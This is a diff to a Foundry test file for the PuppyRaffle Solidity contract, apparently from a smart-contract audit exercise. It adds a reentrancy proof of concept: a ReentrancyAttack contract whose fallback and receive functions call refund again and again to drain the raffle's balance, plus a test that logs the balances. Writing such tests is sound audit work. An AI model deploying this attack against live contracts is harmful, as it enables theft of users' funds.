@@ -245,5 +245,64 @@ contract PuppyRaffleTest is Test {
 
         assert(gasUsedFirst < gasUsedSecond);
     }
-    
+
+    function test_reentrancy_refund() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        ReentrancyAttack attackerContract = new ReentrancyAttack(puppyRaffle);
+        address attackUser = makeAddr("attackUser");
+        vm.deal(attackUser, 1 ether);
+
+        uint256 startingAttackContractBalance = address(attackerContract).balance;
+        uint256 startingContractBalance = address(puppyRaffle).balance;
+
+        // Attack
+        vm.prank(attackUser);
+        attackerContract.attack{value: entranceFee}();
+
+        emit log_named_uint("starting attacker contract balance", startingAttackContractBalance);
+        emit log_named_uint("starting contract balance", startingContractBalance);
+        emit log_named_uint("ending attacker contract balance", address(attackerContract).balance);
+        emit log_named_uint("ending contract balance", address(puppyRaffle).balance);
+    }
 }
+
+contract ReentrancyAttack {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    function _stealMoney() internal {
+        if (address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+
+    fallback() external payable {
+        _stealMoney();
+    }
+
+    receive() external payable {
+        _stealMoney();
+    }
+}
+
